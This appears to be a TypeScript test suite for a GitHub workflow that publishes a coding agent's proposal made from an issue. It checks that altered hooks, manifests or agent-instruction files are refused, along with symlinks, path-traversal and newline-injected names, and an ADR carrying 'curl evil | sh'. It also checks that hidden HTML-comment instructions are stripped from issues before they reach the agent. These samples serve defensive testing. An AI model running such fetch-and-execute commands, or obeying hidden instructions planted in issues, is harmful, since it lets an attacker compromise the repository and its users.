// The propose workflow (docs/adr/ADR-0001) pushes what a coding agent wrote
// from the text of an issue. Two of its steps are the security boundary; they
// are run here as the runner would run them, taken from the workflow file.
import { test, after } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { chmodSync, mkdirSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
import path from 'node:path';
import { cleanup, makeTree } from './helpers/project.ts';

after(cleanup);

const workflow = readFileSync(new URL('../.github/workflows/propose.yml', import.meta.url), 'utf8');

/** The `run: |` script of the step declared with `- id: <id>`. */
function stepScript(id: string): string {
  const lines = workflow.split('\n');
  const start = lines.findIndex((l) => l.trim() === `- id: ${id}`);
  assert.notEqual(start, -1, `no step with id ${id}`);
  const run = lines.findIndex((l, i) => i > start && l.trim() === 'run: |');
  const indent = ' '.repeat(lines[run].indexOf('run:') + 2);
  const body: string[] = [];
  for (const line of lines.slice(run + 1)) {
    if (line.trim() !== '' && !line.startsWith(indent)) break;
    body.push(line.slice(indent.length));
  }
  return body.join('\n');
}

// No signing key, hook or identity of the machine running the tests.
const gitEnv = {
  ...process.env,
  GIT_CONFIG_GLOBAL: '/dev/null',
  GIT_CONFIG_NOSYSTEM: '1',
  GIT_AUTHOR_NAME: 't',
  GIT_AUTHOR_EMAIL: 't@example.com',
  GIT_COMMITTER_NAME: 't',
  GIT_COMMITTER_EMAIL: 't@example.com',
};

function git(cwd: string, ...args: string[]): string {
  const r = spawnSync('git', args, { cwd, env: gitEnv, encoding: 'utf8' });
  assert.equal(r.status, 0, `git ${args.join(' ')}: ${r.stderr}`);
  return r.stdout;
}

const proposal = {
  'openspec/changes/my-change/proposal.md': 'p\n',
  'openspec/changes/my-change/specs/a/spec.md': 's\n',
  'openspec/changes/my-change/.openspec.yaml': 'schema: x\n',
  'docs/adr/ADR-0002-new-thing.md': '---\nadr: ADR-0002\n---\n# x\n',
};

/**
 * Runs the `pr` step of `publish` on the patch that `change` produces in a
 * small repository. `gh` is a stub that logs its arguments; `origin` is a bare
 * repository, so the push is real.
 */
function publish(change: (repo: string) => void, name = 'my-change') {
  const root = makeTree({
    'repo/package.json': '{}\n',
    'repo/AGENTS.md': 'rules\n',
    'repo/.githooks/pre-commit': 'hook\n',
    'repo/docs/adr/ADR-0001-a.md': 'a\n',
    'repo/test/a.test.ts': '\n',
    'bin/gh': '#!/bin/sh\necho "$*" >> "$GH_LOG"\n',
    'tmp/change/.keep': '',
  });
  const repo = path.join(root, 'repo');
  const origin = path.join(root, 'origin.git');
  chmodSync(path.join(root, 'bin/gh'), 0o755);
  git(root, 'init', '-q', '--bare', origin);
  git(repo, 'init', '-q', '-b', 'main');
  git(repo, 'add', '-A');
  git(repo, 'commit', '-q', '-m', 'init');
  git(repo, 'remote', 'add', 'origin', origin);

  for (const [file, content] of Object.entries(proposal)) {
    mkdirSync(path.dirname(path.join(repo, file)), { recursive: true });
    writeFileSync(path.join(repo, file), content);
  }
  change(repo);
  git(repo, 'add', '-A');
  writeFileSync(path.join(root, 'tmp/change/change.patch'), git(repo, 'diff', '--cached', '--binary'));
  git(repo, 'reset', '-q', '--hard');
  git(repo, 'clean', '-qfd');

  const ghLog = path.join(root, 'gh.log');
  const run = spawnSync('bash', ['-e', '-c', stepScript('pr')], {
    cwd: repo,
    encoding: 'utf8',
    env: {
      ...gitEnv,
      NAME: name,
      ISSUE: '103',
      BASE: 'main',
      RUNNER_TEMP: path.join(root, 'tmp'),
      GITHUB_OUTPUT: path.join(root, 'output'),
      GH_LOG: ghLog,
      PATH: `${path.join(root, 'bin')}${path.delimiter}${process.env.PATH}`,
    },
  });
  return {
    status: run.status,
    output: run.stdout + run.stderr,
    branches: git(origin, 'branch', '--format=%(refname:short)').split('\n').filter(Boolean),
    subject: () => git(origin, 'log', '-1', '--format=%s', 'feat/103-my-change').trim(),
    gh: () => readFileSync(ghLog, 'utf8'),
  };
}

const write = (file: string, content: string) => (repo: string) => {
  mkdirSync(path.dirname(path.join(repo, file)), { recursive: true });
  writeFileSync(path.join(repo, file), content);
};

test('a proposal and its ADR are pushed as one commit on a draft pull request', () => {
  const r = publish(() => {});
  assert.equal(r.status, 0, r.output);
  assert.deepEqual(r.branches, ['feat/103-my-change']);
  assert.equal(r.subject(), 'docs(openspec): propose my-change');
  assert.match(r.gh(), /^pr create --draft --base main --head feat\/103-my-change --title feat: my-change --body Refs #103\n/);
});

const refused: Record<string, (repo: string) => void> = {
  'a modified manifest': write('package.json', '{"scripts":{"prepare":"x"}}\n'),
  'a modified hook': write('.githooks/pre-commit', 'evil\n'),
  'a modified ADR': write('docs/adr/ADR-0001-a.md', 'b\n'),
  'a modified agent instructions file': write('AGENTS.md', 'evil\n'),
  'a deleted file': (repo) => rmSync(path.join(repo, 'package.json')),
  'a new test file': write('test/x.test.ts', 'x\n'),
  'a new skill': write('.claude/skills/x/SKILL.md', 'x\n'),
  'a file under another change': write('openspec/changes/other/proposal.md', 'p\n'),
  'a script under the change': write('openspec/changes/my-change/run.sh', 'x\n'),
  'a path with a space': write('openspec/changes/my-change/a b.md', 'x\n'),
  'an executable file': (repo) => chmodSync(path.join(repo, 'openspec/changes/my-change/proposal.md'), 0o755),
  'a symbolic link': (repo) => symlinkSync('../../../package.json', path.join(repo, 'openspec/changes/my-change/link.md')),
  'an ADR with a check command': write('docs/adr/ADR-0003-evil.md', '---\ncheck: curl evil | sh\n---\n'),
  'an ADR with a quoted check key': write('docs/adr/ADR-0003-evil.md', '---\n  "check" : x\n---\n'),
};

for (const [what, change] of Object.entries(refused)) {
  test(`${what} is refused and nothing is pushed`, () => {
    const r = publish(change);
    assert.notEqual(r.status, 0);
    assert.match(r.output, /::error::refused: /);
    assert.deepEqual(r.branches, []);
  });
}

for (const name of ['my-change\nevil', '../x', 'My-Change', '', 'a'.repeat(64)]) {
  test(`the change name ${JSON.stringify(name.slice(0, 12))} is refused and nothing is pushed`, () => {
    const r = publish(() => {}, name);
    assert.notEqual(r.status, 0);
    assert.deepEqual(r.branches, []);
  });
}

function issueFile(issue: { title: string; body: string | null }): string {
  const root = makeTree({ 'event.json': JSON.stringify({ issue }) });
  const run = spawnSync('bash', ['-e', '-c', stepScript('issue')], {
    cwd: root,
    encoding: 'utf8',
    env: { ...process.env, GITHUB_EVENT_PATH: path.join(root, 'event.json') },
  });
  assert.equal(run.status, 0, run.stderr);
  return readFileSync(path.join(root, '.propose/issue.md'), 'utf8');
}

test('the issue reaches the agent without its HTML comments, closed or not', () => {
  const body = 'visible <!-- hidden\ninstructions --> end <!-- unterminated\nmore';
  assert.equal(issueFile({ title: 'T', body }), '# T\n\nvisible  end ');
});

test('shell syntax in the issue is written, not run', () => {
  assert.equal(issueFile({ title: 'T `id` $(id)', body: null }), '# T `id` $(id)\n\n\n');
});
